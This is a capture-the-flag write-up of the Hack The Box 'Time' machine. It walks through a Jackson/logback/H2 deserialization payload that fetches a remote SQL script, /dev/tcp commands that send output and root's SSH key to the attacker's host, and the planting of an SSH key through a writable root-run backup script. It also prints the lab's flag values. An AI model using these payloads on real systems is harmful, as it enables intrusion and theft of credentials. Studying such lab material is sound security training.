# HTB - Time

## Overview

![](<machine>.infocard.png)

Short description to include any strange things to be dealt with...This machine was dissapointingly easy for a medium box. It definitely should have been classified 'Easy'.  A simple test at the beginning revealed a verbose error message.  Some quick googling leads to an easy to use exploit.  After that simple enumeration leads to a weakly protected script that gets executed as root, and leaves the player a million routes to root through arbitrary code execution.

## Useful Skills and Tools

#### Useful thing 1

- description with generic example

#### Useful thing 2

- description with generic example

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.214`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output (.nmap,.gnmap, and .xml) with filenames of `<name>`.

```
┌──(zweilos㉿kali)-[~/htb/time]
└─$ nmap -sCV -n -p- -Pn -v -oA time  10.10.10.214 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 18:08 EDT

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 43.18 seconds
```

ony two ports open, 22- SSH, and 80 - HTTP

### port 80 HTTP

```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected character ('<' (code 60)): expected a valid value (number, String, array, object, 'true', 'false' or 'null')
```

Did a test for XSS, got an unhandled Java exception

```
(function ($) {
  'use strict';
  /*==================================================================
    [ Validate ]*/
  var input = $('.validate-input .input100');
  $('.validate-form').on('submit', function () {
    var check = true;
    for (var i = 0; i < input.length; i++) {
      if (validate(input[i]) == false) {
        showValidate(input[i]);
        check = false;
      }
    }
    return check;
  });
  $('.validate-form .input100').each(function () {
    $(this).focus(function () {
      hideValidate(this);
    });
  });
  function validate(input) {
    if ($(input).attr('type') == 'email' || $(input).attr('name') == 'email') {
      if ($(input).val().trim().match(/^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{1,5}|[0-9]{1,3})(\]?)$/) == null) {
        return false;
      }
    } 
    else {
      if ($(input).val().trim() == '') {
        return false;
      }
    }
  }
  function showValidate(input) {
    var thisAlert = $(input).parent();
    $(thisAlert).addClass('alert-validate');
  }
  function hideValidate(input) {
    var thisAlert = $(input).parent();
    $(thisAlert).removeClass('alert-validate');
  }
}) (jQuery);
```

Checked the source code for the page, noticed a file `main.js`

^--nothing?

Searched for exploits related to com.fasterxml.jackson.core

https://blog.doyensec.com/2019/07/22/jackson-gadgets.html

https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce-through/java/sid-3929



```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('id > /dev/tcp/10.10.14.159/8081')
```

test.sql

```
"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"}]"
```



```
["ch.qos.logback.core.db.DriverManagerConnectionSource",+{"url"%3a"jdbc%3ah2%3amem%3a%3bTRACE_LEVEL_SYSTEM_OUT%3d3%3bINIT%3dRUNSCRIPT+FROM+'http%3a//10.10.14.159%3a8082/test.sql'"}]
```

AFter some testing, I discovered that the POC code had some `\` that they were using to excape the quotes.  These were causing the validator in this case to throw an error.  


```
┌──(zweilos㉿kali)-[~/htb/time]
└─$ python3 -m http.server 8082                 
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
10.10.10.214 - - [15/Mar/2021 19:31:42] "GET /test.sql HTTP/1.1" 200 -
10.10.10.214 - - [15/Mar/2021 19:36:15] "GET /test.sql HTTP/1.1" 200 -
```

After I removed them from my code I got a connection back, downloading my test.sql.

```
zweilos@kali:~/htb/time$ nc -lvnp 8081
listening on [any] 8081 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 36640
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
```

I got a connection back on my machine, proving the remote code execution worked.  Next I replaced the `id` command with a reverse shell.  

## Initial Foothold

```
zweilos@kali:~/htb/time$ nc -lvnp 8081
listening on [any] 8081 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 36644
bash: cannot set terminal process group (894): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ which python3
which python3
/usr/bin/python3
pericles@time:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
pericles@time:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 8081
zweilos@kali:~/htb/time$ stty size
27 104
zweilos@kali:~/htb/time$ stty raw -echo
nc -lvnp 8081aa:~/htb/time$ 

pericles@time:/var/www/html$ stty rows 27 columns 104
pericles@time:/var/www/html$ export TERM=xterm-256color
```

After changing the code in my test.sql file and sending it again, I recieved a reverse shell from the machine.  I quickly upgraded to a full TTY and began enumeration.

```
<?php
if(isset($_POST['data'])){
        if(isset($_POST['mode']) && $_POST['mode'] === "2"){
                $filename = tempnam("/dev/shm", "payload");
                $myfile = fopen($filename, "w") or die("Unable to open file!");
                $txt = $_POST['data'];
                fwrite($myfile, $txt);
                fclose($myfile);
                exec("/usr/bin/jruby /opt/json_project/parse.rb $filename 2>&1", $cmdout, $ret);
                unlink($filename);
                if($ret === 0){
                        $output = '<pre>Validation successful!</pre>';
                }
                else{
                        $output = '<pre>Validation failed: ' . $cmdout[1] . '</pre>';
                }
        }
        else{
                $json_ugly = $_POST['data'];
                $json_pretty = json_encode(json_decode($json_ugly), JSON_PRETTY_PRINT);
                $output = '<pre>'.$json_pretty.'</pre>';
        }

}
?>
```

index.php for the json validator site had some interesting code in it




## Road to User

### Further enumeration

### Finding user creds


### User.txt

```
pericles@time:/$ cd ~
pericles@time:/home/pericles$ ls -la
total 44
drwxr-xr-x 7 pericles pericles 4096 Oct 23 09:45 .
drwxr-xr-x 3 root     root     4096 Oct  2 13:45 ..
lrwxrwxrwx 1 root     root        9 Oct  1 15:05 .bash_history -> /dev/null
-rw-r--r-- 1 pericles pericles  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 pericles pericles 3771 Feb 25  2020 .bashrc
drwx------ 2 pericles pericles 4096 Sep 20 13:53 .cache
drwx------ 3 pericles pericles 4096 Oct 22 17:45 .config
drwx------ 2 pericles pericles 4096 Mar 15 21:49 .gnupg
lrwxrwxrwx 1 root     root        9 Oct  1 15:07 .lhistory -> /dev/null
drwxrwxr-x 3 pericles pericles 4096 Sep 29 12:52 .local
-rw-r--r-- 1 pericles pericles  807 Feb 25  2020 .profile
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 snap
-r-------- 1 pericles pericles   33 Mar 15 11:35 user.txt
pericles@time:/home/pericles$ cat user
cat: user: No such file or directory
pericles@time:/home/pericles$ cat user.txt 
f2555e4414a9821013d82bfbdb6d13e3
```

After checking `pericles`' home directory I found the `user.txt` proof!


## Path to Power \(Gaining Administrator Access\)

### Enumeration as `pericles`

```
default-remote: local
remotes:
  images:
    addr: https://images.linuxcontainers.org
    protocol: simplestreams
    public: true
  local:
    addr: unix://
    public: false
aliases: {}
```

in lxd directory

```
pericles@time:/home/pericles/snap/lxd/17886/.config/lxc$ find / -group pericles 2>/dev/null
/usr/bin/timer_backup.sh
/dev/shm/payloadah34hL
/proc/989
...snipped proc files
/home/pericles
/home/pericles/.gnupg
/home/pericles/.gnupg/trustdb.gpg
/home/pericles/.gnupg/pubring.kbx
/home/pericles/.bashrc
/home/pericles/.bash_logout
/home/pericles/user.txt
/home/pericles/.profile
/home/pericles/.config
/home/pericles/.config/procps
/home/pericles/.local
/home/pericles/.local/share
/home/pericles/.local/share/nano
/home/pericles/snap
/home/pericles/snap/lxd
/home/pericles/snap/lxd/17886
/home/pericles/snap/lxd/17886/.config
/home/pericles/snap/lxd/17886/.config/lxc
/home/pericles/snap/lxd/17886/.config/lxc/config.yml
/home/pericles/snap/lxd/common
/home/pericles/snap/lxd/current
/home/pericles/snap/lxd/17936
/home/pericles/snap/lxd/17936/.config
/home/pericles/snap/lxd/17936/.config/lxc
/home/pericles/snap/lxd/17936/.config/lxc/config.yml
/home/pericles/.cache
/home/pericles/.cache/motd.legal-displayed
/tmp/hsperfdata_pericles
/tmp/hsperfdata_pericles/75713
/var/www/html
/opt/json_project/parse.rb
/opt/json_project/classpath
/opt/json_project/classpath/h2-1.4.199.jar
/opt/json_project/classpath/jackson-databind-2.9.8.jar
/opt/json_project/classpath/logback-core-1.3.0-alpha5.jar
/opt/json_project/classpath/jackson-core-2.9.8.jar
/opt/json_project/classpath/jackson-annotations-2.9.8.jar
```

I did a search for files that the group `pericles` had access to.  

```
pericles@time:/dev/shm$ ls -la
total 4
drwxrwxrwt  2 root     root       60 Mar 16 21:30 .
drwxr-xr-x 18 root     root     3980 Mar 16 14:16 ..
-rw-------  1 pericles pericles  161 Mar 16 21:30 payloadah34hL
pericles@time:/dev/shm$ cat payloadah34hL 
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.159:8082/test.sql'"}]
```

The exploit code that I had used to access the machine was saved as a file in `/dev/shm` apparently.

```
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip

```
I also found the file `/usr/bin/timer_backup.sh`.  It looked like it was probably a cron script that made backups of the website data.  I decided it would be a good place to check to see if there was anything interesting in old backups

```
pericles@time:/etc$ cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
pericles@time:/etc$ ls -la cron
ls: cannot access 'cron': No such file or directory
pericles@time:/etc$ cd cron.d
pericles@time:/etc/cron.d$ ls -la
total 24
drwxr-xr-x   2 root root 4096 Sep 21 03:22 .
drwxr-xr-x 102 root root 4096 Feb 10 15:20 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  191 Apr 23  2020 popularity-contest
pericles@time:/etc/cron.d$ cat php 
# /etc/cron.d/php@PHP_VERSION@: crontab fragment for PHP
#  This purges session files in session.save_path older than X,
#  where X is defined in seconds as the largest value of
#  session.gc_maxlifetime from all your SAPI php.ini files
#  or 24 minutes if not defined.  The script triggers only
#  when session.save_handler=files.
#
#  WARNING: The scripts tries hard to honour all relevant
#  session PHP options, but if you do something unusual
#  you have to disable this script and take care of your
#  sessions yourself.

# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
pericles@time:/etc/cron.d$ cat e2scrub_all 
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
```

I searched through all of the crons and didn't find the script.  

```
pericles@time:/etc$ grep -r timer_backup.sh * 2>/dev/null
systemd/system/web_backup.service:ExecStart=/bin/bash /usr/bin/timer_backup.sh
```

Next, I used grep to search for the name of the script in all of the files in `/etc` and got a hit in the `systemd/system/web_backup.service` file.

```
pericles@time:/etc$ ls -la systemd/system/web_backup.service
-rw-r--r-- 1 root root 106 Oct 23 04:57 systemd/system/web_backup.service
```

This service was running as root.  

```
pericles@time:/etc$ ls -la /usr/bin/timer_backup.sh
-rwxrw-rw- 1 pericles pericles 88 Mar 16 22:25 /usr/bin/timer_backup.sh
```

I double checked the permissions on the script, and saw that it was fully owned by `pericles`, and I could both read and write it.  I decided to change the script to do a backup of root's Private key.


### Getting a shell

```
#!/bin/bash
cat /root/.ssh/id_rsa > /dev/tcp/10.10.14.159/8082 2>&1
```

```
┌──(zweilos㉿kali)-[~/htb/time]
└─$ nc -lvnp 8082 > time.key
listening on [any] 8082 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 33180
                                                                                                        
┌──(zweilos㉿kali)-[~/htb/time]
└─$ cat time.key 
cat: /root/.ssh/id_rsa: No such file or directory
```

Unfortunately it appeared as if there was no `id_rsa` file, or the script was not running as root.

```
#!/bin/bash
echo $(id) > /dev/tcp/10.10.14.159/8082 2>&1
```

Next I changed the script so it would send me the user ID information of the context the script was being run under

```
┌──(zweilos㉿kali)-[~/htb/time]
└─$ nc -lvnp 8082 > time.key
listening on [any] 8082 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 33196
                                                                                                        
┌──(zweilos㉿kali)-[~/htb/time]
└─$ cat time.key
uid=0(root) gid=0(root) groups=0(root)
```

It was definitely running as root.

```
#!/bin/bash
echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBnfsDltTXRqAn25L5a+Z9ODhDJJYO8Wm37tG//hh4kyxcn6IhZ+pykEkDLSsLIUsomyvY5cC8hFLBw96Hs0w0U=' >>  /root/.ssh/authorized_keys
echo "Key away! Try to log in through SSH." > /dev/tcp/10.10.14.159/8082
```

Next I tried sending my SSH public key to `root`'s `authorized_keys` file.  Each time I modified the script it only took a few seconds until it connected back, but just in case I added a message to let me know when it was done.

```
┌──(zweilos㉿kali)-[~/htb/time]
└─$ nc -lvnp 8082                                                                             148 ⨯ 1 ⚙
listening on [any] 8082 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 33236
Key away! Try to log in through SSH.
```

### Root.txt

```
┌──(zweilos㉿kali)-[~/htb/time]
└─$ ssh root@10.10.10.214 -i root.key                                                               1 ⚙
The authenticity of host '10.10.10.214 (10.10.10.214)' can't be established.
ECDSA key fingerprint is SHA256:sMBq2ECkw0OgfWnm+CdzEgN36He1XtCyD76MEhD/EKU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.214' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 16 Mar 2021 10:44:04 PM UTC

  System load:             0.31
  Usage of /:              18.6% of 27.43GB
  Memory usage:            27%
  Swap usage:              0%
  Processes:               237
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.214
  IPv6 address for ens160: dead:beef::250:56ff:feb9:e959


168 updates can be installed immediately.
47 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Feb  9 14:41:33 2021
root@time:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
time
root@time:~# cat root.txt 
14335af5e1db1ea31c221882be1389c6
root@time:~# ls -la
total 5816
drwx------  7 root root    4096 Mar 16 22:43 .
drwxr-xr-x 20 root root    4096 Mar 16 22:43 ..
-rw-r--r--  1 root root 5900858 Mar 16 22:43 backup.zip
lrwxrwxrwx  1 root root       9 Oct  2 13:46 .bash_history -> /dev/null
-rw-r--r--  1 root root    3106 Dec  5  2019 .bashrc
drwx------  2 root root    4096 Feb 10 15:18 .cache
drwx------  3 root root    4096 Feb 10 15:18 .config
drwxr-xr-x  3 root root    4096 Feb 10 15:18 .local
-rw-r--r--  1 root root     161 Dec  5  2019 .profile
-r--------  1 root root      33 Mar 16 14:17 root.txt
-rw-r--r--  1 root root      66 Oct 22 08:45 .selected_editor
drwxr-xr-x  3 root root    4096 Feb 10 15:18 snap
drwx------  2 root root    4096 Feb 10 15:18 .ssh
-rwxr--r--  1 root root      88 Oct 22 08:49 timer_backup.sh
-rw-------  1 root root     929 Feb  9 14:42 .viminfo
root@time:~# cat timer_backup.sh 
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```

And that was it!

note: If you ran `script` earlier to log your console, make sure to type exit until you get the "Script done." message, back on your box.



Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) & [`felamos`](https://app.hackthebox.eu/users/27390) for something interesting or useful about this machine.

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
